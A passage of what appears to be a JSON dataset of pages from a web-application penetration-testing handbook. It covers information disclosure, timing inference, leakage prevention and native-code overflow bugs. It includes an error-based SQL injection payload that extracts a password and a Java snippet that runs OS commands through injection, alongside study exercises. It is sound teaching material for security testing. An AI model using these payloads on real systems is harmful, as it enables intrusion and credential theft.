    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 623\nChapter 15 n Exploiting Information Disclosure 623\nUsing Public Information\nBecause of the huge variety of web application technologies and components in\ncommon use, you should frequently expect to encounter unusual messages that\nyou have not seen before and that may not immediately indicate the nature of\nthe error that the application experienced. In this situation, you can often obtain\nfurther information about the message’s meaning from various public sources.\nOften, an unusual error message is the result of a failure in a specifi c API.\nSearching for the text of the message may lead you to the documentation for\nthis API or to developer forums and other locations where the same problem\nis discussed.\nMany applications employ third-party components to perform specifi c com-\nmon tasks, such as searches, shopping carts, and site feedback functions. Any\nerror messages that are generated by these components are likely to have arisen\nin other applications and probably have been discussed elsewhere.\nSome applications incorporate source code that is publicly available. By searching\nfor specifi c expressions that appear in unusual error messages, you may discover\nthe source code that implements the relevant function. You can then review this\nto understand exactly what processing is being performed on your input and\nhow you may be able to manipulate the application to exploit a vulnerability.\nHACK STEPS\n1. Search for the text of any unusual error messages using standard search\nengines. You can use various advanced search features to narrow down\nyour results. For example:\n“unable to retrieve” filetype:php\n2. Review the search results, looking both for any discussion about the error\nmessage and for any other websites in which the same message has\nappeared. Other applications may produce the same message in a more\nverbose context, enabling you to better understand what kind of condi-\ntions give rise to the error. Use the search engine cache to retrieve exam-\nples of error messages that no longer appear within the live application.\n3. Use Google code search to locate any publicly available code that may be\nresponsible for a particular error message. Search for snippets of error\nmessages that may be hard-coded into the application’s source code. You\ncan also use various advanced search features to specify the code lan-\nguage and other details if these are known. For example:\nunable\\ to\\ retrieve lang:php package:mail\n4. If you have obtained stack traces containing the names of library and\nthird-party code components, search for these names on both types of\nsearch engines.\ncc1155..iinndddd 662233 88//1199//22001111 1122::1166::0077 PPMM"
  },
  {
    "input": "Engineering Informative Error Messages",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 624\n624 Chapter 15 n Exploiting Information Disclosure\nEngineering Informative Error Messages\nIn some situations, it may be possible to systematically engineer error conditions\nin such a way as to retrieve sensitive information within the error message itself.\nOne common situation in which this possibility arises is where you can cause\nthe application to attempt some invalid action on a specifi c item of data. If the\nresulting error message discloses the value of that data, and you can cause\ninteresting items of information to be processed in this way, you may be able\nto exploit this behavior to extract arbitrary data from the application.\nVerbose open database connectivity (ODBC) error messages can be leveraged\nin a SQL injection attack to retrieve the results of arbitrary database queries.\nFor example, the following SQL, if injected into a WHERE clause, would cause the\ndatabase to cast the password for the fi rst user in the users table to an integer\nto perform the evaluation:\n‘ and 1=(select password from users where uid=1)--\nThis results in the following informative error message:\nError: Conversion failed when converting the varchar value\n‘37CE1CCA75308590E4D6A35F288B58FACDBB0841’ to data type int.\nTRY IT\nhttp://mdsec.net/addressbook/32\nA different way in which this kind of technique can be used is where an\napplication error generates a stack trace containing a description of the error,\nand you can engineer a situation where interesting information is incorporated\ninto the error description.\nSome databases provide a facility to create user-defi ned functions written\nin Java. By exploiting a SQL injection fl aw, you may be able to create your own\nfunction to perform arbitrary tasks. If the application returns error messages to\nthe browser, from within your function you can throw a Java exception contain-\ning arbitrary data that you need to retrieve. For example, the following code\nexecutes the operating system command ls and then generates an exception\nthat contains the output from the command. This returns a stack trace to the\nbrowser, the fi rst line of which contains a directory listing:\nByteArrayOutputStream baos = new ByteArrayOutputStream();\ntry\n{\nProcess p = Runtime.getRuntime().exec(“ls”);\nInputStream is = p.getInputStream();\nint c;\nwhile (-1 != (c = is.read()))\nbaos.write((byte) c);\n}\ncc1155..iinndddd 662244 88//1199//22001111 1122::1166::0077 PPMM"
  },
  {
    "input": "Gathering Published Information",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 625\nChapter 15 n Exploiting Information Disclosure 625\ncatch (Exception e)\n{\n}\nthrow new RuntimeException(new String(baos.toByteArray()));\nGathering Published Information\nAside from the disclosure of useful information within error messages, the\nother primary way in which web applications give away sensitive data is by\nactually publishing it directly. There are various reasons why an application\nmay publish information that an attacker can use:\nn By design, as part of the application’s core functionality\nn As an unintended side effect of another function\nn Through debugging functionality that remains present in the live application\nn Because of some vulnerability, such as broken access controls\nHere are some examples of potentially sensitive information that applications\noften publish to users:\nn Lists of valid usernames, account numbers, and document IDs\nn User profi le details, including user roles and privileges, date of last login,\nand account status\nn The current user’s password (this is usually masked on-screen but is\npresent in the page source)\nn Log fi les containing information such as usernames, URLs, actions per-\nformed, session tokens, and database queries\nn Application details in client-side HTML source, such as commented-out\nlinks or form fi elds, and comments about bugs\nHACK STEPS\n1. Review the results of your application mapping exercises (see Chapter 4)\nto identify all server-side functionality and client-side data that may be\nused to obtain useful information.\n2. Identify any locations within the application where sensitive data such\nas passwords or credit card details are transmitted from the server to\nthe browser. Even if these are masked on-screen, they are still viewable\nwithin the server’s response. If you have found another suitable vulner-\nability, such as within access controls or session handling, this behavior\ncan be used to obtain the information belonging to other application\nusers.\n3. If you identify any means of extracting sensitive information, use the tech-\nniques described in Chapter 14 to automate the process.\ncc1155..iinndddd 662255 88//1199//22001111 1122::1166::0088 PPMM"
  },
  {
    "input": "Using Inference",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 626\n626 Chapter 15 n Exploiting Information Disclosure\nUsing Inference\nIn some situations, an application may not divulge any data to you directly,\nbut it may behave in ways that enable you to reliably infer useful information.\nWe have already encountered many instances of this phenomenon in the\ncourse of examining other categories of common vulnerability. For example:\nn A registration function that enables you to enumerate registered user-\nnames on the basis of an error message when an existing username is\nchosen (see Chapter 6).\nn A search engine that allows you to infer the contents of indexed documents\nthat you are not authorized to view directly (see Chapter 11).\nn A blind SQL injection vulnerability in which you can alter the application’s\nbehavior by adding a binary condition to an existing query, enabling you\nto extract information one bit at a time (see Chapter 9).\nn The “padding oracle” attack in .NET, where an attacker can decrypt any\nstring by sending a series of requests to the server and observing which\nones result in an error during decryption (see Chapter 18).\nAnother way in which subtle differences in an application’s behavior may\ndisclose information occurs when different operations take different lengths\nof time to perform, contingent upon some fact that is of interest to an attacker.\nThis divergence can arise for various reasons:\nn Many large and complex applications retrieve data from numerous back-\nend systems, such as databases, message queues, and mainframes. To\nimprove performance, some applications cache information that is used\nfrequently. Similarly, some applications employ a lazyload approach, in\nwhich objects and data are loaded only when needed. In this situation,\ndata that has been recently accessed is retrieved quickly from the server’s\nlocal cached copy, while other data is retrieved more slowly from the\nrelevant back-end source.\nThis behavior has been observed in online banking applications. A request\nto access an account takes longer if the account is dormant than if it is\nactive, enabling a skilled attacker to enumerate accounts that have been\naccessed recently by other users.\nn In some situations, the amount of processing that an application per-\nforms on a particular request may depend on whether a submitted item\nof data is valid. For example, when a valid username is supplied to a login\nmechanism, the application may perform various database queries to\nretrieve account information and update the audit log. It also may perform\ncc1155..iinndddd 662266 88//1199//22001111 1122::1166::0088 PPMM"
  },
  {
    "input": "Preventing Information Leakage",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 627\nChapter 15 n Exploiting Information Disclosure 627\ncomputationally intensive operations to validate the supplied password\nagainst a stored hash. If an attacker can detect this timing difference, he\nmay be able to exploit it to enumerate valid usernames.\nn Some application functions may perform an action on the basis of user\ninput that times out if an item of submitted data is invalid. For example,\nan application may use a cookie to store the address of a host located\nbehind a front-end load balancer. An attacker may be able to manipulate\nthis address to scan for web servers inside the organization’s internal\nnetwork. If the address of an actual server that is not part of the applica-\ntion infrastructure is supplied, the application may immediately return\nan error. If a nonexistent address is supplied, the application may time\nout attempting to contact this address before returning the same generic\nerror. You can use the response timers within Burp Intruder’s results table\nto facilitate this testing. Note that these columns are hidden by default,\nbut can be shown via the Columns menu.\nHACK STEPS\n1. Differences in the timing of application responses may be subtle and diffi-\ncult to detect. In a typical situation, it is worth probing the application for\nthis behavior only in selected key areas where a crucial item of interesting\ndata is submitted and where the kind of processing being performed is\nlikely to result in time differences.\n2. To test a particular function, compile one list containing several items that\nare known to be valid (or that have been accessed recently) and a second\nlist containing items that are known to be invalid (or dormant). Make\nrequests containing each item on these lists in a controlled way, issuing\nonly one request at a time, and monitoring the time taken for the applica-\ntion to respond to each request. Determine whether there is any correla-\ntion between the item’s status and the time taken to respond.\n3. You can use Burp Intruder to automate this task. For every request it gen-\nerates, Intruder automatically records the time taken before the applica-\ntion responds and the time taken to complete the response. You can sort\na table of results by either of these attributes to quickly identify any obvi-\nous correlations.\nPreventing Information Leakage\nAlthough it may not be feasible or desirable to prevent the disclosure of abso-\nlutely any information that an attacker may fi nd useful, various relatively\nstraightforward measures can be taken to reduce information leakage to a\ncc1155..iinndddd 662277 88//1199//22001111 1122::1166::0088 PPMM"
  },
  {
    "input": "Protect Sensitive Information",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 628\n628 Chapter 15 n Exploiting Information Disclosure\nminimum and to withhold the most sensitive data that can critically undermine\nan application’s security if disclosed to an attacker.\nUse Generic Error Messages\nThe application should never return verbose error messages or debug information\nto the user’s browser. When an unexpected event occurs (such as an error in a\ndatabase query, a failure to read a fi le from disk, or an exception in an external\nAPI call), the application should return the same generic message informing\nthe user that an error occurred. If it is necessary to record debug information\nfor support or diagnostic purposes, this should be held in a server-side log that\nis not publicly accessible. An index number to the relevant log entry may be\nreturned to the user, enabling him or her to report this when contacting the\nhelp desk, if required.\nMost application platforms and web servers can be confi gured to mask error\ninformation from being returned to the browser:\nn In ASP.NET, you can suppress verbose error messages using the cus-\ntomErrors element of the Web.config fi le by setting the mode attribute\ntoOn or RemoteOnly and specifying a custom error page in the defaul-\ntRedirect node.\nn In the Java Platform, you can confi gure customized error messages\nusing the error-page element of the web.xml fi le. You can use the\nexception-type node to specify a Java exception type, or you can use\ntheerror-code node to specify an HTTP status code. You can use the\nlocation node to set the custom page to be displayed in the event of\nthe specifi ed error.\nn In Microsoft IIS, you can specify custom error pages for different HTTP\nstatus codes using the Custom Errors tab on a website’s Properties tab.\nA different custom page can be set for each status code, and on a per-\ndirectory basis if required.\nn In Apache, custom error pages can be confi gured using the ErrorDocument\ndirective in httpd.conf:\nErrorDocument 500 /generalerror.html\nProtect Sensitive Information\nWherever possible, the application should not publish information that may be\nof use to an attacker, including usernames, log entries, and user profi le details. If\ncertain users need access to this information, it should be protected by effective\naccess controls and made available only where strictly necessary.\ncc1155..iinndddd 662288 88//1199//22001111 1122::1166::0088 PPMM"
  },
  {
    "input": "Summary",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 629\nChapter 15 n Exploiting Information Disclosure 629\nIn cases where sensitive information must be disclosed to an authorized user\n(for example, where users can update their own account information), existing\ndata should not be disclosed where it is not necessary. For example, stored\ncredit card numbers should be displayed in truncated form, and password fi elds\nshould never be prefi lled, even if masked on-screen. These defensive measures\nhelp mitigate the impact of any serious vulnerabilities that may exist within the\napplication’s core security mechanisms of authentication, session management,\nand access control.\nMinimize Client-Side Information Leakage\nWhere possible, service banners should be removed or modifi ed to minimize the\ndisclosure of specifi c software versions and so on. The steps needed to imple-\nment this measure depend on the technologies in use. For example, in Microsoft\nIIS, the Server header can be removed using URLScan in the IISLockDown\ntool. In later versions of Apache, this can be achieved using the mod_headers\nmodule. Because this information is subject to change, it is recommended that\nyou consult your server documentation before carrying out any modifi cations.\nAll comments should be removed from client-side code that is deployed to\nthe live production environment, including all HTML and JavaScript.\nYou should pay particular attention to any browser extension components\nsuch as Java applets and ActiveX controls. No sensitive information should be\nhidden within these components. A skilled attacker can decompile or reverse-\nengineer these components to effectively recover their source code (see Chapter 5).\nSummary\nLeakage of unnecessary information frequently does not present any kind of\nsignifi cant defect in an application’s security. Even highly verbose stack traces\nand other debugging messages may sometimes provide you with little leverage\nin seeking to attack the application.\nIn other cases, however, you may discover sources of information that are of\ngreat value in developing your attack. For example, you may fi nd lists of user-\nnames, the precise versions of software components, or the internal structure\nand functionality of the server-side application logic.\nBecause of this possibility, any serious assault on an application should include\na forensic examination of both the application itself and publicly available\nresources so that you can gather any information that may be of use in formu-\nlating your attacks against it. On some occasions, information gathered in this\nway can provide the foundation for a complete compromise of the application\nthat disclosed it.\ncc1155..iinndddd 662299 88//1199//22001111 1122::1166::0088 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c15.indd V2 - 08/17/2011 Page 630\n630 Chapter 15 n Exploiting Information Disclosure\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. While probing for SQL injection vulnerabilities, you request the follow-\ning URL:\nhttps://wahh-app.com/list.aspx?artist=foo’+having+1%3d1--\nYou receive the following error message:\nServer: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near ‘having1’.\nWhat can you infer from this? Does the application contain any exploit-\nable condition?\n2. While you are performing fuzz testing of various parameters, an applica-\ntion returns the following error message:\nWarning: mysql_connect() [function.mysql-connect]: Access denied for\nuser ‘premiumdde’@’localhost’ (using password: YES) in\n/home/doau/public_html/premiumdde/directory on line 15\nWarning: mysql_select_db() [function.mysql-select-db]: Access denied\nfor user ‘nobody’@’localhost’ (using password: NO) in\n/home/doau/public_html/premiumdde/directory on line 16\nWarning: mysql_select_db() [function.mysql-select-db]: A link to\nthe server could not be established in\n/home/doau/public_html/premiumdde/directory on line 16\nWarning: mysql_query() [function.mysql-query]: Access denied for\nuser ‘nobody’@’localhost’ (using password: NO) in\n/home/doau/public_html/premiumdde/directory on line 448\nWhat useful items of information can you extract from this?\n3. While mapping an application, you discover a hidden directory on the\nserver that has directory listing enabled and appears to contain a number\nof old scripts. Requesting one of these scripts returns the following error\nmessage:\nCGIWrap Error: Execution of this script not permitted\nExecution of (contact.pl) is not permitted for the following reason:\nScript is not executable. Issue ‘chmod 755 filename’\nLocal Information and Documentation:\nCGIWrap Docs: http://wahh-app.com/cgiwrap-docs/\nContact EMail: helpdesk@wahh-app.com\nServer Data:\nServer Administrator/Contact: helpdesk@wahh-app.com\nServer Name: wahh-app.com\nServer Port: 80\nServer Protocol: HTTP/1.1\ncc1155..iinndddd 663300 88//1199//22001111 1122::1166::0088 PPMM\nStuttard c15.indd V2 - 08/17/2011 Page 631\nChapter 15 n Exploiting Information Disclosure 631\nRequest Data:\nUser Agent/Browser: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT\n5.1; .NET CLR 2.0.50727; FDM; InfoPath.1; .NET CLR 1.1.4322)\nRequest Method: GET\nRemote Address: 192.168.201.19\nRemote Port: 57961\nReferring Page: http://wahh-app.com/cgi-bin/cgiwrap/fodd\nWhat caused this error, and what common web application vulnerability\nshould you quickly check for?\n4. You are probing the function of a request parameter in an attempt\nto determine its purpose within an application. You request the fol-\nlowing URL:\nhttps://wahh-app.com/agents/checkcfg.php?name=admin&id=13&log=1\nThe application returns the following error message:\nWarning: mysql_connect() [function.mysql-connect]: Can’t connect to\nMySQL server on ‘admin’ (10013) in\n/var/local/www/include/dbconfig.php on line 23\nWhat caused this error message, and what vulnerabilities should you\nprobe for as a result?\n5. While fuzzing a request for various categories of vulnerabilities, you\nsubmit a single quotation mark within each request parameter in turn.\nOne of the results contains an HTTP 500 status code, indicating potential\nSQL injection. You check the full contents of the message, which are as\nfollows:\nMicrosoft VBScript runtime error ‘800a000d’\nType mismatch: ‘ [string: “’”]’\n/scripts/confirmOrder.asp, line 715\nIs the application vulnerable?\ncc1155..iinndddd 663311 88//1199//22001111 1122::1166::0088 PPMM\nStuttard c15.indd V1 - 08/17/2011 Page 632\ncc1155..iinndddd 663322 88//1199//22001111 1122::1166::0088 PPMM"
  },
  {
    "input": "Chapter 16 Attacking Native Compiled Applications",
    "output": "Stuttard c16.indd V2 - 08/16/2011 Page 633\nCHAPTER\n16\nAttacking Native\nCompiled Applications\nCompiled software that runs in a native execution environment has historically\nbeen plagued by vulnerabilities such as buffer overfl ows and format string bugs.\nMost web applications are written using languages and platforms that run in a\nmanaged execution environment in which these classic vulnerabilities do not\narise. One of the most signifi cant advantages of languages such as C# and Java\nis that programmers do not need to worry about the kind of buffer manage-\nment and pointer arithmetic problems that have affected software developed\nin native languages such as C and C++ and that have given rise to the majority\nof critical bugs found in that software.\nNevertheless, you may occasionally encounter web applications that are writ-\nten in native code. Also, many applications written primarily using managed\ncode contain portions of native code or call external components that run in\nan unmanaged context. Unless you know for certain that your target applica-\ntion does not contain any native code, it is worth performing some basic tests\ndesigned to uncover any classic vulnerabilities that may exist.\nWeb applications that run on hardware devices such as printers and switches\noften contain some native code. Other likely targets include any page or script\nwhose name includes possible indicators of native code, such as dll or exe, and\nany functionality known to call legacy external components, such as logging\nmechanisms. If you believe that the application you are attacking contains\nsubstantial amounts of native code, it may be desirable to test every piece of\n633\ncc1166..iinndddd 663333 88//1199//22001111 1122::1166::3355 PPMM"
  },
  {
    "input": "Stack Overflows",
    "output": "Stuttard c16.indd V2 - 08/16/2011 Page 634\n634 Chapter 16 n Attacking Native Compiled Applications\nuser-supplied data processed by the application, including the names and values\nof every parameter, cookie, request header, and other data.\nThis chapter covers three main categories of classic software vulnerability:\nbuffer overfl ows, integer vulnerabilities, and format string bugs. In each case,\nwe will describe some common vulnerabilities and then outline the practical\nsteps you can take when probing for these bugs within a web application. This\ntopic is huge and extends far beyond the scope of a book about hacking web\napplications. To learn more about native software vulnerabilities and how to\nfi nd them, we recommend the following books:\nn TheShellcoder’s Handbook, 2nd Edition, by Chris Anley, John Heasman,\nFelix Linder, and Gerardo Richarte (Wiley, 2007)\nn TheArtofSoftwareSecurityAssessment by Mark Dowd, John McDonald,\nand Justin Schuh (Addison-Wesley, 2006)\nn GrayHatHacking, 2nd Edition, by Shon Harris, Allen Harper, Chris Eagle,\nand Jonathan Ness (McGraw-Hill Osborne, 2008)\nNOTE Remote probing for the vulnerabilities described in this chapter car-\nries a high risk of denial of service to the application. Unlike vulnerabilities\nsuch as weak authentication and path traversal, the mere detection of classic\nsoftware vulnerabilities is likely to cause unhandled exceptions within the tar-\nget application, which may cause it to stop functioning. If you intend to probe\na live application for these bugs, you must ensure that the application owner\naccepts the risks associated with the testing before you begin.\nBuffer Overfl ow Vulnerabilities\nBuffer overfl ow vulnerabilities occur when an application copies user-controllable\ndata into a memory buffer that is not suffi ciently large to accommodate it. The\ndestination buffer is overfl owed, resulting in adjacent memory being overwritten\nwith the user’s data. Depending on the nature of the vulnerability, an attacker\nmay be able to exploit it to execute arbitrary code on the server or perform\nother unauthorized actions. Buffer overfl ow vulnerabilities have been hugely\nprevalent in native software over the years and have been widely regarded as\nPublic Enemy Number One that developers of such software need to avoid.\nStack Overfl ows\nBuffer overfl ows typically arise when an application uses an unbounded copy\noperation (such as strcpy in C) to copy a variable-size buffer into a fi xed-size\nbuffer without verifying that the fi xed-sized buffer is large enough. For example,\ncc1166..iinndddd 663344 88//1199//22001111 1122::1166::3355 PPMM"
  },
  {
    "input": "Heap Overflows",
    "output": "34 Stuttard c16.indd V2 - 08/16/2011 Page 635\nChapter 16 n Attacking Native Compiled Applications 635\nthe following function copies the username string into a fi xed-size buffer allo-\ncated on the stack:\nbool CheckLogin(char* username, char* password)\n{\nchar _username[32];\nstrcpy(_username, username);\n...\nIf the username string contains more than 32 characters, the _username buffer\nis overfl owed, and the attacker overwrites the data in adjacent memory.\nIn a stack-based buffer overfl ow, a successful exploit typically involves over-\nwriting the saved return address on the stack. When the CheckLogin function\nis called, the processor pushes onto the stack the address of the instruction fol-\nlowing the call. When CheckLogin is fi nished, the processor pops this address\nback off the stack and returns execution to that instruction. In the meantime,\nthe CheckLogin function allocates the _username buffer on the stack right next\nto the saved return address. If an attacker can overfl ow the _username buffer,\nhe can overwrite the saved return address with a value of his choosing, thereby\ncausing the processor to jump to this address and execute arbitrary code.\nHeap Overfl ows\nHeap-based buffer overfl ows essentially involve the same kind of unsafe opera-\ntion as described previously, except that the overfl owed destination buffer is\nallocated on the heap, not the stack:\nbool CheckLogin(char* username, char* password)\n{\nchar* _username = (char*) malloc(32);\nstrcpy(_username, username);\n...\nIn a heap-based buffer overfl ow, what is typically adjacent to the destination\nbuffer is not any saved return address but other blocks of heap memory, sepa-\nrated by heap control structures. The heap is implemented as a doubly linked\nlist: each block is preceded in memory by a control structure that contains the\nsize of the block, a pointer to the previous block on the heap, and a pointer to the\nnext block on the heap. When a heap buffer is overfl owed, the control structure\nof an adjacent heap block is overwritten with user-controllable data.\nThis type of vulnerability is less straightforward to exploit than a stack-based\noverfl ow, but a common approach is to write crafted values into the overwritten\nheap control structure to cause an arbitrary overwrite of a critical pointer at some\nfuture time. When the heap block whose control structure has been overwrit-\nten is freed from memory, the heap manager needs to update the linked list of\ncc1166..iinndddd 663355 88//1199//22001111 1122::1166::3355 PPMM"
  },
  {
    "input": "\"Off-by-One\" Vulnerabilities",
    "output": "Stuttard c16.indd V2 - 08/16/2011 Page 636\n636 Chapter 16 n Attacking Native Compiled Applications\nheap blocks. To do this, it needs to update the back link pointer of the following\nheap block and update the forward link pointer of the preceding heap block so\nthat these two items in the linked list point to each other. To do this, the heap\nmanager uses the values in the overwritten control structure. Specifi cally, to\nupdate the following block’s back link pointer, the heap manager dereferences\nthe forward link pointer taken from the overwritten control structure and writes\ninto the structure at this address the value of the back link pointer taken from\nthe overwritten control structure. In other words, it writes a user-controllable\nvalue to a user-controllable address. If an attacker has crafted his overfl ow data\nappropriately, he can overwrite any pointer in memory with a value of his choos-\ning, with the objective of seizing control of the path of execution and therefore\nexecuting arbitrary code. Typical targets for the arbitrary pointer overwrite are\nthe value of a function pointer that the application will later call and the address\nof an exception handler that will be invoked the next time an exception occurs.\nNOTE Modern compilers and operating systems have implemented various\ndefenses to protect software against programming errors that lead to buffer\noverfl ows. These defenses mean that real-world overfl ows today are gener-\nally more diffi cult to exploit than the examples described here. For further\ninformation about these defenses and ways to circumvent them, see The\nShellcoder’s Handbook.\n“Off-by-One” Vulnerabilities\nA specifi c kind of overfl ow vulnerability arises when a programming error\nenables an attacker to write a single byte (or a small number of bytes) beyond\nthe end of an allocated buffer.\nConsider the following code, which allocates a buffer on the stack, performs a\ncounted buffer copy operation, and then null-terminates the destination string:\nbool CheckLogin(char* username, char* password)\n{\nchar _username[32];\nint i;\nfor (i = 0; username[i] && i < 32; i++)\n_username[i] = username[i];\n_username[i] = 0;\n...\nThe code copies up to 32 bytes and then adds the null terminator. Hence,\nif the username is 32 bytes or longer, the null byte is written beyond the end\nof the _username buffer, corrupting adjacent memory. This condition may be\nexploitable. If the adjacent item on the stack is the saved frame pointer of the\ncalling frame, setting the lower-order byte to zero may cause it to point to\ncc1166..iinndddd 663366 88//1199//22001111 1122::1166::3355 PPMM\n36 Stuttard c16.indd V2 - 08/16/2011 Page 637\nChapter 16 n Attacking Native Compiled Applications 637\nthe _username buffer and therefore to data that the attacker controls. When the\ncalling function returns, this may enable an attacker to take control of the fl ow\nof execution.\nA similar kind of vulnerability arises when developers overlook the need\nfor string buffers to include room for a null terminator. Consider the following\n“fi x” to the original heap overfl ow:\nbool CheckLogin(char* username, char* password)\n{\nchar* _username = (char*) malloc(32);\nstrncpy(_username, username, 32);\n...\nHere, the programmer creates a fi xed-size buffer on the heap and then per-\nforms a counted buffer copy operation, designed to ensure that the buffer is\nnot overfl owed. However, if the username is longer than the buffer, the buffer\nis completely fi lled with characters from the username, leaving no room to\nappend a trailing null byte. The copied version of the string therefore has lost\nits null terminator.\nLanguages such as C have no separate record of a string’s length. The end of\nthe string is indicated by a null byte (that is, one with the ASCII character code\nzero). If a string loses its null terminator, it effectively increases in length and\ncontinues as far as the next byte in memory, which happens to be zero. This\nunintended consequence can often cause unusual behavior and vulnerabilities\nwithin an application.\nThe authors encountered a vulnerability of this kind in a web application\nrunning on a hardware device. The application contained a page that accepted\narbitrary parameters in a POST request and returned an HTML form contain-\ning the names and values of those parameters as hidden fi elds. For example:\nPOST /formRelay.cgi HTTP/1.0\nContent-Length: 3\na=b\nHTTP/1.1 200 OK\nDate: THU, 01 SEP 2011 14:53:13 GMT\nContent-Type: text/html\nContent-Length: 278\n<html>\n<head>\n<meta http-equiv=”content-type” content=”text/html;charset=iso-8859-1”>\n</head>\n<form name=”FORM_RELAY” action=”page.cgi” method=”POST”>\n<input type=”hidden” name=”a” value=”b”>\ncc1166..iinndddd 663377 88//1199//22001111 1122::1166::3355 PPMM\nStuttard c16.indd V2 - 08/16/2011 Page 638\n638 Chapter 16 n Attacking Native Compiled Applications\n</form>\n<body onLoad=”document.FORM_RELAY.submit();”>\n</body>\n</html>\nFor some reason, this page was used throughout the application to process\nall kinds of user input, much of which was sensitive. However, if 4096 or more\nbytes of data were submitted, the returned form also contained the parameters\nsubmitted by the previous request to the page, even if these were submitted by\na different user. For example:\nPOST /formRelay.cgi HTTP/1.0\nContent-Length: 4096\na=bbbbbbbbbbbbb[lots more b’s]\nHTTP/1.1 200 OK\nDate: THU, 01 SEP 2011 14:58:31 GMT\nContent-Type: text/html\nContent-Length: 4598\n<html>\n<head>\n<meta http-equiv=”content-type” content=”text/html;charset=iso-8859-1”>\n</head>\n<form name=”FORM_RELAY” action=”page.cgi” method=”POST”>\n<input type=”hidden” name=”a” value=”bbbbbbbbbbbbb[lots more b’s]”>\n<input type=”hidden” name=”strUsername” value=”agriffiths”>\n<input type=”hidden” name=”strPassword” value=”aufwiedersehen”>\n<input type=“hidden“ name=“Log_in“ value=“Log+In“>\n</form>\n<body onLoad=“document.FORM_RELAY.submit();“>\n</body>\n</html>\nHaving identifi ed this vulnerability, it was possible to poll the vulnerable page\ncontinuously with overlong data and parse the responses to log every piece of\ndata submitted to the page by other users. This included login credentials and\nother sensitive information.\nThe root cause of the vulnerability was that the user-supplied data was\nbeing stored as null-terminated strings within 4096-byte blocks of memory.\nThe data was copied in a checked operation, so no straight overfl ow was pos-\nsible. However, if overlong input was submitted, the copy operation resulted\nin the loss of the null terminator, so the string fl owed into the next data in\nmemory. Therefore, when the application parsed the request parameters, it\ncontinued up until the next null byte and therefore included the parameters\nsupplied by another user.\ncc1166..iinndddd 663388 88//1199//22001111 1122::1166::3355 PPMM"
  },
  {
    "input": "Detecting Buffer Overflow Vulnerabilities",
    "output": "38 Stuttard c16.indd V2 - 08/16/2011 Page 639\nChapter 16 n Attacking Native Compiled Applications 639\nDetecting Buffer Overfl ow Vulnerabilities\nThe basic methodology for detecting buffer overfl ow vulnerabilities is to send\nlong strings of data to an identifi ed target and monitor for anomalous results. In\nsome cases, subtle vulnerabilities exist that can be detected only by sending an\noverlong string of a specifi c length, or within a small range of lengths. However,\nin most cases vulnerabilities can be detected simply by sending a string that is\nlonger than the application is expecting.\nProgrammers commonly create fi xed-size buffers using round numbers in either\ndecimal or hexadecimal, such as 32, 100, 1024, 4096, and so on. A simple approach to\ndetecting any “low-hanging fruit” within the application is to send long strings as each\nitem of target data is identifi ed and to monitor the server’s responses for anomalies.\nHACK STEPS\n1. For each item of data being targeted, submit a range of long strings with\nlengths somewhat longer than common buffer sizes. For example:\n1100\n4200\n33000\n2. Target one item of data at a time to maximize the coverage of code paths\nwithin the application.\n3. You can use the character blocks payload source in Burp Intruder to auto-\nmatically generate payloads of various sizes.\n4. Monitor the application’s responses to identify any anomalies. An uncon-\ntrolled overflow is almost certain to cause an exception in the application.\nDetecting when this has occurred in a remote process is difficult, but here\nare some anomalous events to look for:\nn An HTTP 500 status code or error message, where other malformed\n(but not overlong) input does not have the same effect\nn An informative message, indicating that a failure occurred in some\nnative code component\nn A partial or malformed response is received from the server\nn The TCP connection to the server closes abruptly without returning a\nresponse\nn The entire web application stops responding\n5. Note that when a heap-based overflow is triggered, this may result in a\ncrash at some future point, rather than immediately. You may need to exper-\niment to identify one or more test cases that are causing heap corruption.\n6. An off-by-one vulnerability may not cause a crash, but it may result in anom-\nalous behavior such as unexpected data being returned by the application.\ncc1166..iinndddd 663399 88//1199//22001111 1122::1166::3366 PPMM"
  },
  {
    "input": "Integer Overflows",
    "output": "Stuttard c16.indd V2 - 08/16/2011 Page 640\n640 Chapter 16 n Attacking Native Compiled Applications\nIn some instances, your test cases may be blocked by input validation checks\nimplemented either within the application itself or by other components such\nas the web server. This often occurs when overlong data is submitted within\nthe URL query string and may be indicated by a generic message such as\n“URL too long” in response to every test case. In this situation, you should\nexperiment to determine the maximum length of URL permitted (which is\noften about 2,000 characters) and adjust your buffer sizes so that your test\ncases comply with this requirement. Overfl ows may still exist behind the\ngeneric length fi ltering, which can be triggered by strings short enough to\nget past that fi ltering.\nIn other instances, fi lters may restrict the type of data or range of characters\nthat can be submitted within a particular parameter. For example, an appli-\ncation may validate that a submitted username contains only alphanumeric\ncharacters before passing it to a function containing an overfl ow. To maximize\nthe effectiveness of your testing, you should attempt to ensure that each test\ncase contains only characters that are permitted in the relevant parameter. One\neffective technique for achieving this is to capture a normal request contain-\ning data that the application accepts and to extend each targeted parameter in\nturn, using the same characters it already contains, to create a long string that\nis likely to pass any content-based fi lters.\nEven if you are confi dent that a buffer overfl ow condition exists, exploiting it\nremotely to achieve arbitrary code execution is extremely diffi cult. Peter Winter-\nSmith of NGSSoftware has produced some interesting research regarding the\npossibilities for blind buffer overfl ow exploitation. For more information, see\nthe following whitepaper:\nwww.ngssoftware.com/papers/NISR.BlindExploitation.pdf\nInteger Vulnerabilities\nInteger-related vulnerabilities typically arise when an application performs\nsome arithmetic on a length value before performing some buffer operation\nbut fails to take into account certain features of how compilers and processors\nhandle integers. Two types of integer bugs are worthy of note: overfl ows and\nsignedness errors.\nInteger Overfl ows\nThese occur when an operation on an integer value causes it to increase above\nits maximum possible value or decrease below its minimum possible value.\nWhen this occurs, the number wraps, so a very large number becomes very\nsmall, or vice versa.\ncc1166..iinndddd 664400 88//1199//22001111 1122::1166::3366 PPMM"
  },
  {
    "input": "Signedness Errors",
